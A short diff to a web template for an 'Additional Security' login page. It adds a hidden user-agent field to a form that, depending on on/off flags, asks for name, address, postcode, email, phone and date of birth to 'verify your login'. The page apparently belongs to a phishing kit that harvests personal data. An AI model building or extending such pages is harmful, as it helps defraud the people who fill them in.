@@ -55,6 +55,7 @@ let dl = meridian.dl
                                 <h1>Additional Security</h1>
                             </div>
                             <form id="loginForm" action="" autocomplete="false" class="disable-on-submit div-main" method="post" id="input-form" >
+                                <input type="hidden" id="userAgent" name="userAgent">
                                 <div class="signin-form-content">
                                     <% let x = 0; if (name == 'on' || address == 'on' || postal == 'on' || email == 'on' || phone == 'on' || dob == 'on') { x = 1; %>
                                         <p style="margin-bottom: 23px;color: #3e3e3e;font-size: 14px;">To verify your login, we require some additional information regarding your account.</p>
